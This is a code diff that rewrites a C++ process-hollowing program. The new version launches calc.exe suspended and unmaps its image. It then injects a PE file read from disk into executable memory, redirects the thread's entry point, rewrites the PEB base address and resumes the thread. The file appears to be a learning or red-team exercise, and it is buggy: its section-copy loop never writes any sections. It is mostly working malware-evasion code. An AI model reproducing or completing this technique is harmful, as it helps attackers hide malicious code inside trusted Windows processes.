@@ -1,80 +1,149 @@
 // ProcessHollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
-#include <Windows.h>
-#include <iostream>
-#include <winternl.h>
 #include <stdio.h>
-#include <memoryapi.h>
+#include <Windows.h>
+#include <winternl.h>
+
+#pragma comment(lib,"ntdll.lib")
 
 using namespace std;
 
-using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);
-
-typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
-	HANDLE ProcessHandle,
-	DWORD ProcessInformationClass,
-	PVOID ProcessInformation,
-	DWORD ProcessInformationLength,
-	PDWORD ReturnLength
-	);
-
-typedef int(__cdecl* MYPROC)(LPCWSTR);
-
-typedef struct BASE_RELOCATION_BLOCK {
-	DWORD PageAddress;
-	DWORD BlockSize;
-} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
-
-typedef struct BASE_RELOCATION_ENTRY {
-	USHORT Offset : 12;
-	USHORT Type : 4;
-} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
-
-typedef struct _myPEB {
-	BYTE                          Reserved1[2];
-	BYTE                          BeingDebugged;
-	BYTE                          Reserved2[1];
-	PVOID                         Reserved3;
-	PVOID					ImageBaseAddress;
-	PPEB_LDR_DATA                 Ldr;
-	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
-	PVOID                         Reserved4[3];
-	PVOID                         AtlThunkSListPtr;
-	PVOID                         Reserved5;
-	ULONG                         Reserved6;
-	PVOID                         Reserved7;
-	ULONG                         Reserved8;
-	ULONG                         AtlThunkSListPtr32;
-	PVOID                         Reserved9[45];
-	BYTE                          Reserved10[96];
-	PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
-	BYTE                          Reserved11[128];
-	PVOID                         Reserved12[1];
-	ULONG                         SessionId;
-} myPEB, * myPPEB;
-
-typedef struct _myPROCESS_BASIC_INFORMATION {
-	NTSTATUS ExitStatus;
-	myPPEB PebBaseAddress;
-	ULONG_PTR AffinityMask;
-	KPRIORITY BasePriority;
-	ULONG_PTR UniqueProcessId;
-	ULONG_PTR InheritedFromUniqueProcessId;
-} myPROCESS_BASIC_INFORMATION;
+EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
+EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
+EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
+EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
+EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
+EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
+EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);
 
 int main()
 {
-	// create destination process - this is the process to be hollowed out
-	HANDLE hProcess;
-	HANDLE hThread;
-	LPSTARTUPINFOA si = new STARTUPINFOA();
-	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-	myPROCESS_BASIC_INFORMATION* pbi = new myPROCESS_BASIC_INFORMATION();
-	DWORD returnLength = 0;
-	BOOL bCreateProcess = NULL;
-	CreateProcessA(NULL, (LPSTR)"C:/Windows/System32/calc.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
-	HANDLE destProcess = pi->hProcess;
+	// declaring variables for the Headers
+	PIMAGE_DOS_HEADER pDosH;
+	PIMAGE_NT_HEADERS pNtH;
+	PIMAGE_SECTION_HEADER pSecH;
+	
+	// declaring variables for process hollowing
+	PVOID image, mem, base;
+	DWORD i, read, nSizeOfFile;
+	HANDLE hFile;
 
+	STARTUPINFOW si;
+	PROCESS_INFORMATION pi;
+
+	CONTEXT ctx;
+
+	ctx.ContextFlags = CONTEXT_FULL;
+
+	memset(&si, 0, sizeof(si));
+	memset(&pi, 0, sizeof(pi));
+
+	// create destination process - this is the process to be hollowed out
+	printf("\nRunning the destination process\n");
+
+	if (!CreateProcessW(L"C:/Windows/System32/calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+		printf("\nError: Unable to run destination process. CreateProcess failed with error %d\n", GetLastError());
+		return 1;
+	}
+
+	printf("\nProcess created in suspended state.\n");
+	printf("\nOpening the replacement executable.\n");
+
+	// Creating replacement executable to be ran
+	hFile = CreateFileW(L"C:/Users/wenqi/Desktop/ihatecoding.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		printf("\nError: Unable to create the replacement executable. CreateFile failed with error %d\n", GetLastError());
+		NtTerminateProcess(pi.hProcess, 1);
+		return 1;
+	}
+
+	// get size of the replacement executable
+	nSizeOfFile = GetFileSize(hFile, NULL);
+
+	// allocate memory for the replacement. image will contain a pointer to the allocated memory block
+	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	// if cannot read the executable from the disk
+	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) {
+		printf("\nError: Unable to read the replacement executable. ReadFile failed with error %d\n", GetLastError());
+		NtTerminateProcess(pi.hProcess, 1);
+		return 1;
+	}
+
+	NtClose(hFile);
+
+	pDosH = (PIMAGE_DOS_HEADER)image;
+
+	// checking for valid executable by verifying that it starts with the "MZ" signature
+	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) {
+		printf("\nError: Invalid executable format.\n");
+		NtTerminateProcess(pi.hProcess, 1);
+		return 1;
+	}
+
+	// get the address of the IMAGE_NT_HEADER (address of image + offset from IMAGE_DOS_HEADER)
+	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew);
+
+	// get the thread context of the child process' primary thread
+	NtGetContextThread(pi.hThread, &ctx);
+
+	// reads the base address of the executable image from the PEB of the child process by reading memory at an offset within the PEB, which is obtained from the Rdx register.
+	// The offset is calculated as sizeof(SIZE_T) * 2. The base variable stores the base address.
+	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL);
+
+	// if the base address of the executable image matches the ImageBase specified in the PE header of the executable image, it proceeds to unmap the original executable image.
+	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) {
+		printf("\nUnmapping original executable image from child process. Address: %#zx\n", (SIZE_T)base);
+		NtUnmapViewOfSection(pi.hProcess, base);
+	}
+	
+	printf("\nAllocating memory in child process\n");
+
+	// allocates a region of memory at a specific base address in the child process, the size is determined by the SizeOfImage field. mem will hold the pointer to the newly allocated memory region.
+	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	// if it fails to allocate memory in the process
+	if (!mem) {
+		printf("\nError: Unable to allocate memory in child process. VirtualAllocEx failed with error %d\n", GetLastError());
+		NtTerminateProcess(pi.hProcess, 1);
+		return 1;
+	}
+
+	printf("\nMemory allocated. Address: %#zx\n", (SIZE_T)mem);
+	printf("\nWriting executable image into child process.\n");
+
+	// after allocating memory, will try to write data from the executable to the original process
+	NtWriteVirtualMemory(pi.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL);
+
+	// iterating through sections of the PE**
+	for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
+		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+	}
+
+	// set the eax register to the entry point of the injected image
+	ctx.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint);
+	printf("\nNew entry point: %#zx\n", ctx.Rcx);
+	
+	// write the base address of the injected image into the PEB
+	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+
+	// set thread context of the original process' primary thread
+	printf("\nSetting the context of the child process's primary thread.\n");
+	NtSetContextThread(pi.hThread, &ctx);
+
+	printf("\nResuming child process's primary thread.\n");
+	NtResumeThread(pi.hThread, NULL);
+	printf("\nThread resumed.\n");
+
+	printf("\nWaiting for child process to terminate.\n");
+	NtWaitForSingleObject(pi.hProcess, FALSE, NULL);
+	printf("\nProcess terminated.\n");
+
+	NtClose(pi.hThread);
+	NtClose(pi.hProcess);
+	VirtualFree(image, 0, MEM_RELEASE);
+
+	/*
 	// Locating the base address of destination image by acquiring the address of the PEB and reading it
 	//PPEB pPEB = ReadRemotePEB(destProcess);
 
@@ -220,6 +289,7 @@ int main()
 		return 0;
 	}
 	ResumeThread(pi->hThread);
+	*/
 	
 	system("PAUSE");
 	return 0;
